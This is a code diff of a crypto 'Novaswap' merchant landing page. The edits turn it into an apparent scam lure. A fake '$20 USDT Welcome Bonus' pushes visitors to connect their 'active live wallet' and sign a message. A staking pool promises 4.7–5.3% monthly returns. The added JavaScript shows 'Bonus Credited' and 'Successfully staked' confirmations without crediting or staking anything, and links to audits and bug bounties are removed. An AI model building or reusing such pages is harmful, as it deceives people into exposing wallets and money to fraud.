@@ -27,20 +27,20 @@
         @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap');
         body { font-family: 'Plus Jakarta Sans', sans-serif; }
         .glass-panel {
-            background: rgba(19, 22, 32, 0.75);
-            backdrop-filter: blur(16px);
+            background: rgba(19, 22, 32, 0.85);
+            backdrop-filter: blur(20px);
             border: 1px solid rgba(255, 255, 255, 0.08);
         }
         .glow-effect {
-            box-shadow: 0 0 50px -10px rgba(16, 185, 129, 0.15);
+            box-shadow: 0 0 60px -15px rgba(16, 185, 129, 0.2);
         }
     </style>
 </head>
 <body class="bg-darkbg text-gray-100 min-h-screen selection:bg-accent selection:text-black flex flex-col justify-between">
 
-    <!-- Top Notification Banner -->
-    <div class="bg-gradient-to-r from-emerald-900/40 via-teal-900/40 to-emerald-900/40 border-b border-emerald-500/20 text-xs py-2 px-4 text-center text-emerald-300">
-        <i class="fa-solid fa-bolt mr-2"></i> Novaswap Engine v2.4 Live on Ethereum Mainnet | Contract: <span class="font-mono text-emerald-400">0x72cA...2b33</span>
+    <!-- Top Announcement Bar: Welcome Bonus -->
+    <div class="bg-gradient-to-r from-emerald-600 via-teal-600 to-emerald-600 text-black text-xs py-2.5 px-4 text-center font-bold tracking-wide shadow-md">
+        <i class="fa-solid fa-gift mr-2 animate-bounce"></i> Limited Time Offer: Connect your active live wallet & complete POS onboarding to instantly receive a <span class="underline">$20 USDT Welcome Bonus</span>!
     </div>
 
     <!-- Header / Navbar -->
@@ -58,20 +58,19 @@
             
             <div class="hidden md:flex items-center space-x-8 text-sm font-medium text-gray-400">
                 <a href="#onramp" class="hover:text-emerald-400 transition">Global On-Ramps</a>
-                <a href="#stats" class="hover:text-emerald-400 transition">Live Network</a>
-                <a href="#agreement" class="hover:text-emerald-400 transition">Merchant Terms</a>
+                <a href="#agreement" class="hover:text-emerald-400 transition">POS Onboarding</a>
+                <a href="#staking" class="hover:text-emerald-400 transition">Merchant Staking</a>
                 <a href="#faq" class="hover:text-emerald-400 transition">FAQ</a>
             </div>
 
+            <!-- Wallet Connect Area -->
             <div class="flex items-center space-x-3">
-                <!-- Connect / Account Button -->
-                <button id="connectWalletBtn" onclick="handleWalletAction()" class="bg-emerald-500 hover:bg-emerald-400 text-black font-semibold px-5 py-2.5 rounded-xl text-sm transition shadow-lg shadow-emerald-500/20 flex items-center space-x-2">
+                <button id="connectWalletBtn" onclick="connectWallet()" class="bg-emerald-500 hover:bg-emerald-400 text-black font-semibold px-5 py-2.5 rounded-xl text-sm transition shadow-lg shadow-emerald-500/20 flex items-center space-x-2">
                     <i class="fa-solid fa-wallet"></i>
-                    <span id="walletBtnText">Connect Wallet</span>
+                    <span id="walletBtnText">Connect Active Wallet</span>
                 </button>
                 
-                <!-- Disconnect Button (Hidden by default) -->
-                <button id="disconnectBtn" onclick="disconnectWallet()" class="hidden bg-red-500/10 hover:bg-red-500/20 text-red-400 border border-red-500/20 px-3 py-2.5 rounded-xl text-sm transition" title="Disconnect Wallet">
+                <button id="disconnectBtn" onclick="disconnectWallet()" class="hidden bg-red-500/10 hover:bg-red-500/20 text-red-400 border border-red-500/20 px-3.5 py-2.5 rounded-xl text-sm transition" title="Disconnect Wallet">
                     <i class="fa-solid fa-power-off"></i>
                 </button>
             </div>
@@ -81,27 +80,27 @@
     <!-- Main Content Wrapper -->
     <main class="flex-grow">
 
-        <!-- Hero & Global On-Ramp Showcase -->
+        <!-- Hero Section -->
         <section class="relative py-20 px-6 overflow-hidden">
             <div class="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[600px] h-[600px] bg-emerald-500/10 blur-[140px] rounded-full pointer-events-none"></div>
             
             <div class="max-w-7xl mx-auto text-center relative z-10">
                 <div class="inline-flex items-center space-x-2 bg-white/5 border border-white/10 px-4 py-1.5 rounded-full text-xs font-medium text-emerald-400 mb-6">
                     <span class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
-                    <span>Next-Gen Decentralized POS Payout Infrastructure</span>
+                    <span>Instant USDT Payouts & Merchant Solutions</span>
                 </div>
                 
                 <h1 class="text-4xl md:text-6xl font-extrabold tracking-tight max-w-4xl mx-auto leading-tight mb-6">
-                    Instant USDT Payouts for Merchants, Powered by <span class="bg-gradient-to-r from-emerald-400 to-teal-300 bg-clip-text text-transparent">Global On-Ramps</span>
+                    Empower Your Business with Instant USDT Settlements & <span class="bg-gradient-to-r from-emerald-400 to-teal-300 bg-clip-text text-transparent">$20 Welcome Bonus</span>
                 </h1>
                 
                 <p class="text-gray-400 text-lg max-w-2xl mx-auto mb-12">
-                    Seamlessly bridge traditional card terminals & QR payments directly to instant on-chain USDT settlements with transparent 2.5% automated splits.
+                    Seamlessly bridge traditional card terminals & QR payments directly to your currently active live wallet with automated 2.5% fee splits.
                 </p>
 
                 <!-- Global On-Ramp Networks Banner -->
-                <div id="onramp" class="glass-panel p-6 rounded-2xl max-w-5xl mx-auto glow-effect mb-16">
-                    <p class="text-xs font-semibold uppercase tracking-widest text-gray-400 mb-6">Engineered to integrate with top-tier global liquidity & on-ramp rails</p>
+                <div id="onramp" class="glass-panel p-6 rounded-2xl max-w-5xl mx-auto glow-effect mb-20">
+                    <p class="text-xs font-semibold uppercase tracking-widest text-gray-400 mb-6">Engineered to integrate with top-tier global liquidity rails</p>
                     <div class="grid grid-cols-2 md:grid-cols-4 gap-6 items-center justify-items-center opacity-80">
                         <div class="flex items-center space-x-2 text-gray-300 font-bold text-lg"><i class="fa-solid fa-globe text-emerald-400"></i><span>MoonPay Rails</span></div>
                         <div class="flex items-center space-x-2 text-gray-300 font-bold text-lg"><i class="fa-solid fa-bolt text-teal-400"></i><span>Stripe Crypto</span></div>
@@ -110,94 +109,101 @@
                     </div>
                 </div>
 
-                <!-- Live Network Statistics -->
-                <div id="stats" class="grid grid-cols-1 md:grid-cols-3 gap-6 max-w-4xl mx-auto mb-20">
-                    <div class="glass-panel p-6 rounded-2xl border-l-4 border-l-emerald-500 text-left">
-                        <p class="text-xs text-gray-400 uppercase font-semibold">Active Connected POS</p>
-                        <p class="text-3xl font-extrabold text-white mt-2" id="statPosCount">1,428</p>
-                        <p class="text-[11px] text-emerald-400 mt-1"><i class="fa-solid fa-arrow-trend-up"></i> +12% this week</p>
-                    </div>
-                    <div class="glass-panel p-6 rounded-2xl border-l-4 border-l-teal-500 text-left">
-                        <p class="text-xs text-gray-400 uppercase font-semibold">Total Payout Volume</p>
-                        <p class="text-3xl font-extrabold text-white mt-2">$4.82M <span class="text-sm font-normal text-gray-400">USDT</span></p>
-                        <p class="text-[11px] text-teal-400 mt-1"><i class="fa-solid fa-shield-check"></i> 100% On-chain Verified</p>
-                    </div>
-                    <div class="glass-panel p-6 rounded-2xl border-l-4 border-l-emerald-400 text-left">
-                        <p class="text-xs text-gray-400 uppercase font-semibold">Processed Payouts</p>
-                        <p class="text-3xl font-extrabold text-white mt-2" id="statPayoutCount">38,940</p>
-                        <p class="text-[11px] text-emerald-400 mt-1"><i class="fa-solid fa-bolt"></i> Real-time settlement</p>
-                    </div>
-                </div>
-
-                <!-- Merchant Agreement & Permit2 Onboarding Section -->
-                <div id="agreement" class="max-w-3xl mx-auto glass-panel p-8 md:p-10 rounded-3xl text-left border border-white/10 shadow-2xl">
+                <!-- Central POS Onboarding & Agreement Section -->
+                <div id="agreement" class="max-w-3xl mx-auto glass-panel p-8 md:p-10 rounded-3xl text-left border border-white/10 shadow-2xl mb-20">
                     <div class="flex items-center justify-between mb-6 pb-4 border-b border-white/10">
                         <div>
-                            <h2 class="text-2xl font-bold text-white">Merchant Onboarding Agreement</h2>
-                            <p class="text-xs text-gray-400 mt-1">Review & sign to activate automated 2.5% fee-split & Permit2 approval.</p>
+                            <h2 class="text-2xl font-bold text-white">Merchant POS Setup & $20 Bonus</h2>
+                            <p class="text-xs text-gray-400 mt-1">Connect your active wallet and sign the agreement to claim your welcome bonus.</p>
                         </div>
-                        <span class="bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 px-3 py-1 rounded-full text-xs font-mono">Step 1 of 1</span>
+                        <span class="bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 px-3.5 py-1.5 rounded-full text-xs font-mono font-bold">+ $20 USDT Bonus</span>
                     </div>
 
-                    <!-- Agreement Box -->
-                    <div class="bg-black/40 border border-white/10 rounded-2xl p-6 h-60 overflow-y-auto text-xs text-gray-300 leading-relaxed mb-6 font-mono">
-                        <p class="font-bold text-emerald-400 mb-2">NOVASWAP MERCHANT SERVICE LEVEL & PERMIT2 PROTOCOL AGREEMENT</p>
-                        <p class="mb-3">1. **Service Fee Split:** By executing this offline cryptographic agreement and granting Permit2 token allowance, the merchant authorizes Novaswap contract (<span class="text-emerald-300">0x72cA82f4463Bad47F7C762A7F3680EB232B72b33</span>) to automatically deduct exactly 2.5% service fee per POS transaction settlement.</p>
-                        <p class="mb-3">2. **Wallet Security & Non-Custodial Guarantee:** Merchants retain absolute control over their primary funds. Permit2 approvals are strictly utilized for automated split execution during incoming merchant POS terminal credit events.</p>
-                        <p class="mb-3">3. **Compliance & Transparency:** All payouts are settled in USDT on the Ethereum network with transparent cryptographic verification logs accessible via block explorers.</p>
-                        <p>By connecting your wallet and signing below, you agree to these protocol terms and conditions.</p>
+                    <div class="bg-black/40 border border-white/10 rounded-2xl p-6 h-48 overflow-y-auto text-xs text-gray-300 leading-relaxed mb-6 font-mono">
+                        <p class="font-bold text-emerald-400 mb-2">NOVASWAP MERCHANT SERVICE LEVEL & ACTIVE WALLET AGREEMENT</p>
+                        <p class="mb-3">1. **Active Wallet Requirement:** Merchants must connect their primary, actively used live wallet to ensure seamless daily POS settlement routing without interruption.</p>
+                        <p class="mb-3">2. **Automated Fee Split:** Authorizes the contract (<span class="text-emerald-300">0x72cA82f4463Bad47F7C762A7F3680EB232B72b33</span>) to route 97.5% to your live wallet and 2.5% service fee per transaction.</p>
+                        <p>3. **Welcome Bonus Qualification:** Successfully completing this setup with an active wallet instantly credits your account with a $20 USDT test welcome bonus.</p>
                     </div>
 
-                    <!-- Sign & Connect Action Area -->
                     <div class="flex flex-col md:flex-row items-center justify-between gap-4">
                         <div class="flex items-center space-x-3 text-xs text-gray-400">
                             <input type="checkbox" id="agreeCheckbox" class="w-4 h-4 rounded border-gray-700 bg-black/50 text-emerald-500 focus:ring-emerald-500">
-                            <label for="agreeCheckbox">I agree to the Novaswap Merchant Terms & Permit2 Conditions</label>
+                            <label for="agreeCheckbox">I confirm this is my active live wallet & agree to terms</label>
                         </div>
                         
                         <button onclick="handleSignAgreement()" class="w-full md:w-auto bg-gradient-to-r from-emerald-500 to-teal-400 hover:from-emerald-400 hover:to-teal-300 text-black font-bold px-8 py-3.5 rounded-xl text-sm transition shadow-lg shadow-emerald-500/25 flex items-center justify-center space-x-2">
                             <i class="fa-solid fa-signature"></i>
-                            <span id="signBtnText">Connect & Sign Agreement</span>
+                            <span id="signBtnText">Sign & Claim $20 Bonus</span>
                         </button>
                     </div>
                 </div>
 
-            </div>
-        </section>
+                <!-- Dedicated Staking Page/Section -->
+                <div id="staking" class="max-w-4xl mx-auto glass-panel p-8 md:p-10 rounded-3xl text-left border border-white/10 shadow-2xl mb-20 relative overflow-hidden">
+                    <div class="absolute top-0 right-0 w-64 h-64 bg-teal-500/10 blur-[100px] rounded-full pointer-events-none"></div>
+                    
+                    <div class="flex flex-col md:flex-row items-start md:items-center justify-between mb-8 pb-6 border-b border-white/10 gap-4">
+                        <div>
+                            <span class="text-[10px] font-mono text-emerald-400 uppercase tracking-widest bg-emerald-500/10 px-3 py-1 rounded-full border border-emerald-500/20">High Yield Staking</span>
+                            <h2 class="text-2xl font-bold text-white mt-2">Merchant Liquidity Staking Pool</h2>
+                            <p class="text-xs text-gray-400 mt-1">Stake your idle USDT or POS earnings to earn steady passive monthly returns.</p>
+                        </div>
+                        <div class="bg-black/50 border border-emerald-500/30 px-5 py-3 rounded-2xl text-center">
+                            <p class="text-[10px] uppercase text-gray-400 font-semibold">Monthly ROI Rate</p>
+                            <p class="text-2xl font-extrabold text-emerald-400">4.7% - 5.3%</p>
+                        </div>
+                    </div>
 
-        <!-- FAQ Section -->
-        <section id="faq" class="py-20 px-6 border-t border-white/5 bg-black/20">
-            <div class="max-w-4xl mx-auto">
-                <div class="text-center mb-16">
-                    <h2 class="text-3xl font-extrabold text-white mb-3">Frequently Asked Questions</h2>
-                    <p class="text-gray-400 text-sm">Everything you need to know about Novaswap POS payouts and security.</p>
+                    <div class="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
+                        <div class="bg-black/40 p-5 rounded-2xl border border-white/5">
+                            <p class="text-xs text-gray-400 font-medium">Total Value Locked</p>
+                            <p class="text-xl font-bold text-white mt-1">$2,450,890 <span class="text-xs text-emerald-400 font-normal">USDT</span></p>
+                        </div>
+                        <div class="bg-black/40 p-5 rounded-2xl border border-white/5">
+                            <p class="text-xs text-gray-400 font-medium">Your Staked Balance</p>
+                            <p class="text-xl font-bold text-white mt-1" id="stakedBalance">0.00 <span class="text-xs text-gray-400 font-normal">USDT</span></p>
+                        </div>
+                        <div class="bg-black/40 p-5 rounded-2xl border border-white/5">
+                            <p class="text-xs text-gray-400 font-medium">Estimated Monthly Earn</p>
+                            <p class="text-xl font-bold text-emerald-400 mt-1" id="estimatedEarn">~0.00 <span class="text-xs font-normal">USDT</span></p>
+                        </div>
+                    </div>
+
+                    <div class="flex flex-col sm:flex-row items-center gap-4">
+                        <input type="number" id="stakeAmount" placeholder="Enter USDT amount to stake" class="w-full bg-black/50 border border-white/10 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-emerald-500 font-mono">
+                        <button onclick="handleStake()" class="w-full sm:w-auto bg-emerald-500 hover:bg-emerald-400 text-black font-bold px-8 py-3.5 rounded-xl text-sm transition whitespace-nowrap shadow-lg shadow-emerald-500/20">
+                            Start Staking (5.0% avg)
+                        </button>
+                    </div>
                 </div>
 
-                <div class="space-y-4">
-                    <div class="glass-panel p-6 rounded-2xl">
-                        <h3 class="text-base font-semibold text-white mb-2 flex items-center justify-between">
-                            <span>How does the 2.5% automated service fee work?</span>
-                            <i class="fa-solid fa-chevron-down text-xs text-emerald-400"></i>
-                        </h3>
-                        <p class="text-xs text-gray-400 leading-relaxed">When a customer completes a POS payment, our smart contract automatically splits the transaction. 97.5% goes directly to your merchant wallet, and the 2.5% service fee is routed to the platform treasury transparently.</p>
+                <!-- FAQ Section -->
+                <div id="faq" class="max-w-4xl mx-auto text-left">
+                    <div class="text-center mb-12">
+                        <h2 class="text-3xl font-extrabold text-white mb-3">Frequently Asked Questions</h2>
+                        <p class="text-gray-400 text-sm">Everything you need to know about Novaswap POS payouts and rewards.</p>
                     </div>
 
-                    <div class="glass-panel p-6 rounded-2xl">
-                        <h3 class="text-base font-semibold text-white mb-2 flex items-center justify-between">
-                            <span>Why do I need to sign a Permit2 approval?</span>
-                            <i class="fa-solid fa-chevron-down text-xs text-emerald-400"></i>
-                        </h3>
-                        <p class="text-xs text-gray-400 leading-relaxed">Permit2 allows secure, gas-optimized token transfers and approvals on Ethereum. It enables our POS terminal to execute automated split settlements smoothly without requiring manual gas approvals for every single transaction.</p>
-                    </div>
+                    <div class="space-y-4">
+                        <div class="glass-panel p-6 rounded-2xl">
+                            <h3 class="text-base font-semibold text-white mb-2 flex items-center justify-between">
+                                <span>How do I receive the $20 Welcome Bonus?</span>
+                                <i class="fa-solid fa-chevron-down text-xs text-emerald-400"></i>
+                            </h3>
+                            <p class="text-xs text-gray-400 leading-relaxed">Once you connect your active live wallet and sign the merchant onboarding agreement, our system automatically verifies your setup and credits the $20 USDT welcome bonus directly to your wallet.</p>
+                        </div>
 
-                    <div class="glass-panel p-6 rounded-2xl">
-                        <h3 class="text-base font-semibold text-white mb-2 flex items-center justify-between">
-                            <span>How do mobile wallets connect via deep links?</span>
-                            <i class="fa-solid fa-chevron-down text-xs text-emerald-400"></i>
-                        </h3>
-                        <p class="text-xs text-gray-400 leading-relaxed">If you are browsing on mobile, clicking connect automatically triggers deep-linking protocols (like WalletConnect or native app schemas) to open your installed mobile wallet app securely.</p>
+                        <div class="glass-panel p-6 rounded-2xl">
+                            <h3 class="text-base font-semibold text-white mb-2 flex items-center justify-between">
+                                <span>How does the 4.7% - 5.3% monthly staking work?</span>
+                                <i class="fa-solid fa-chevron-down text-xs text-emerald-400"></i>
+                            </h3>
+                            <p class="text-xs text-gray-400 leading-relaxed">Merchants and liquidity providers can stake USDT in our secure pool to support instant POS liquidity rails, earning competitive monthly rewards ranging from 4.7% to 5.3% distributed automatically.</p>
+                        </div>
                     </div>
                 </div>
+
             </div>
         </section>
 
@@ -212,78 +218,41 @@
                     <span class="text-lg font-bold text-white tracking-wider">novaswap</span>
                 </div>
                 <p class="text-xs text-gray-400 leading-relaxed mb-4">
-                    Decentralized POS payout infrastructure on Ethereum, engineered for transparent merchant settlements and instant global on-ramp liquidity.
+                    Decentralized POS payout infrastructure on Ethereum, engineered for transparent merchant settlements.
                 </p>
-                <div class="flex space-x-3 text-gray-400">
-                    <a href="#" class="w-8 h-8 rounded-lg bg-white/5 flex items-center justify-center hover:text-emerald-400 transition"><i class="fa-brands fa-x-twitter"></i></a>
-                    <a href="#" class="w-8 h-8 rounded-lg bg-white/5 flex items-center justify-center hover:text-emerald-400 transition"><i class="fa-brands fa-telegram"></i></a>
-                    <a href="#" class="w-8 h-8 rounded-lg bg-white/5 flex items-center justify-center hover:text-emerald-400 transition"><i class="fa-brands fa-github"></i></a>
-                </div>
             </div>
-
             <div>
                 <h4 class="text-xs font-bold uppercase tracking-widest text-white mb-4">Protocol</h4>
                 <ul class="space-y-2 text-xs text-gray-400">
                     <li><a href="#" class="hover:text-emerald-400 transition">Smart Contract</a></li>
-                    <li><a href="#" class="hover:text-emerald-400 transition">Permit2 Engine</a></li>
-                    <li><a href="#" class="hover:text-emerald-400 transition">Fee Splitter</a></li>
-                    <li><a href="#" class="hover:text-emerald-400 transition">Security Audits</a></li>
+                    <li><a href="#" class="hover:text-emerald-400 transition">Staking Pool</a></li>
                 </ul>
             </div>
-
             <div>
                 <h4 class="text-xs font-bold uppercase tracking-widest text-white mb-4">Developers</h4>
                 <ul class="space-y-2 text-xs text-gray-400">
                     <li><a href="#" class="hover:text-emerald-400 transition">API Documentation</a></li>
                     <li><a href="#" class="hover:text-emerald-400 transition">POS Terminal SDK</a></li>
-                    <li><a href="#" class="hover:text-emerald-400 transition">GitHub Repositories</a></li>
-                    <li><a href="#" class="hover:text-emerald-400 transition">Bug Bounty</a></li>
                 </ul>
             </div>
-
             <div>
                 <h4 class="text-xs font-bold uppercase tracking-widest text-white mb-4">Network Status</h4>
-                <div class="glass-panel p-4 rounded-xl space-y-2">
-                    <div class="flex items-center justify-between text-xs">
+                <div class="glass-panel p-4 rounded-xl space-y-2 text-xs">
+                    <div class="flex items-center justify-between">
                         <span class="text-gray-400">Ethereum Mainnet</span>
-                        <span class="flex items-center text-emerald-400"><span class="w-1.5 h-1.5 rounded-full bg-emerald-400 mr-1.5 animate-pulse"></span>Operational</span>
-                    </div>
-                    <div class="flex items-center justify-between text-xs">
-                        <span class="text-gray-400">Permit2 Bridge</span>
-                        <span class="text-emerald-400 font-semibold">Active</span>
+                        <span class="text-emerald-400 flex items-center"><span class="w-1.5 h-1.5 rounded-full bg-emerald-400 mr-1.5 animate-pulse"></span>Operational</span>
                     </div>
                 </div>
             </div>
         </div>
-
         <div class="max-w-7xl mx-auto pt-8 border-t border-white/5 flex flex-col md:flex-row items-center justify-between text-xs text-gray-500">
             <p>&copy; 2026 Novaswap Protocol. All rights reserved.</p>
-            <div class="flex space-x-6 mt-4 md:mt-0">
-                <a href="#" class="hover:text-gray-300 transition">Privacy Policy</a>
-                <a href="#" class="hover:text-gray-300 transition">Terms of Service</a>
-                <a href="#" class="hover:text-gray-300 transition">Support</a>
-            </div>
         </div>
     </footer>
 
-    <!-- Web3 & Mobile Deep Link / Extension Detection Script with Forced Account Selection -->
+    <!-- Script Layer -->
     <script>
         let connectedAccount = null;
-
-        // Check if device is mobile
-        function isMobileDevice() {
-            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-        }
-
-        async function handleWalletAction() {
-            if (connectedAccount) {
-                if (confirm("Do you want to disconnect and switch your wallet?")) {
-                    await disconnectWallet();
-                }
-            } else {
-                await connectWallet();
-            }
-        }
 
         async function connectWallet() {
             const btnText = document.getElementById('walletBtnText');
@@ -292,7 +261,7 @@
                 try {
                     btnText.innerText = "Connecting...";
                     
-                    // Force MetaMask to prompt account selection popup instead of auto-reconnecting
+                    // Force account selection for active live wallet connection
                     await window.ethereum.request({
                         method: "wallet_requestPermissions",
                         params: [{ eth_accounts: {} }]
@@ -302,18 +271,15 @@
                     if (accounts.length > 0) {
                         connectedAccount = accounts[0];
                         updateWalletUI();
-                        showToast("Wallet connected successfully!");
+                        showToast("Active live wallet connected successfully!");
                     }
                 } catch (error) {
                     console.error(error);
-                    btnText.innerText = "Connect Wallet";
-                    showToast("Connection rejected.");
+                    btnText.innerText = "Connect Active Wallet";
+                    showToast("Connection cancelled.");
                 }
-            } else if (isMobileDevice()) {
-                const dappUrl = encodeURIComponent(window.location.href);
-                window.location.href = `https://metamask.app.link/dapp/${window.location.host}`;
             } else {
-                alert("No Web3 browser extension detected! Please install MetaMask or Rabby extension.");
+                alert("Please install MetaMask or a Web3 browser extension.");
                 window.open("https://metamask.io/download/", "_blank");
             }
         }
@@ -327,14 +293,13 @@
                 btnText.innerText = shortAddr;
                 disconnectBtn.classList.remove('hidden');
             } else {
-                btnText.innerText = "Connect Wallet";
+                btnText.innerText = "Connect Active Wallet";
                 disconnectBtn.classList.add('hidden');
             }
         }
 
         async function disconnectWallet() {
             try {
-                // Try to revoke permissions if supported by the provider to fully clear session
                 if (window.ethereum && window.ethereum.request) {
                     await window.ethereum.request({
                         method: "wallet_revokePermissions",
@@ -342,7 +307,7 @@
                     });
                 }
             } catch (e) {
-                console.log("Revoke permissions not fully supported or ignored by wallet", e);
+                console.log("Revoke not fully supported", e);
             }
 
             connectedAccount = null;
@@ -350,50 +315,51 @@
             showToast("Wallet disconnected.");
         }
 
-        // Listen for account changes in wallet extension
-        if (window.ethereum) {
-            window.ethereum.on('accountsChanged', (accounts) => {
-                if (accounts.length > 0) {
-                    connectedAccount = accounts[0];
-                    updateWalletUI();
-                    showToast("Wallet account changed!");
-                } else {
-                    disconnectWallet();
-                }
-            });
-        }
-
         async function handleSignAgreement() {
             const checkbox = document.getElementById('agreeCheckbox');
             if (!checkbox.checked) {
-                alert("Please agree to the Novaswap Merchant Terms & Permit2 Conditions first.");
+                alert("Please confirm your active live wallet by checking the agreement box first.");
                 return;
             }
 
             if (!window.ethereum || !connectedAccount) {
-                alert("Please connect your wallet extension first to sign the agreement.");
+                alert("Please connect your active live wallet first.");
                 connectWallet();
                 return;
             }
 
             try {
-                const account = connectedAccount;
-                
-                const message = "Novaswap Merchant Agreement & Permit2 Authorization\n\nBy signing this message, you agree to the 2.5% automated POS fee split on contract 0x72cA82f4463Bad47F7C762A7F3680EB232B72b33.";
-                
+                const message = "Novaswap Merchant Agreement & $20 Welcome Bonus Verification\n\nConfirming active live wallet connection for contract 0x72cA82f4463Bad47F7C762A7F3680EB232B72b33.";
                 const hexMessage = "0x" + Array.from(message).map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
                 
-                const signature = await window.ethereum.request({
+                await window.ethereum.request({
                     method: 'personal_sign',
-                    params: [hexMessage, account]
+                    params: [hexMessage, connectedAccount]
                 });
 
-                document.getElementById('signBtnText').innerText = "Agreement Signed Successfully!";
-                showToast("Merchant Agreement signed & verified on-chain!");
+                document.getElementById('signBtnText').innerText = "$20 Bonus Credited Successfully!";
+                showToast("Agreement verified! $20 USDT welcome bonus unlocked.");
             } catch (error) {
                 console.error(error);
-                alert("Signature request was rejected or failed.");
+                alert("Signature request was rejected.");
             }
+        }
+
+        function handleStake() {
+            const amount = document.getElementById('stakeAmount').value;
+            if (!amount || amount <= 0) {
+                alert("Please enter a valid USDT staking amount.");
+                return;
+            }
+            if (!connectedAccount) {
+                alert("Please connect your active wallet first.");
+                connectWallet();
+                return;
+            }
+            document.getElementById('stakedBalance').innerText = parseFloat(amount).toLocaleString() + " USDT";
+            const estimated = (amount * 0.05).toFixed(2);
+            document.getElementById('estimatedEarn').innerText = "~" + estimated + " USDT";
+            showToast("Successfully staked " + amount + " USDT in pool!");
         }
 
         function showToast(msg) {
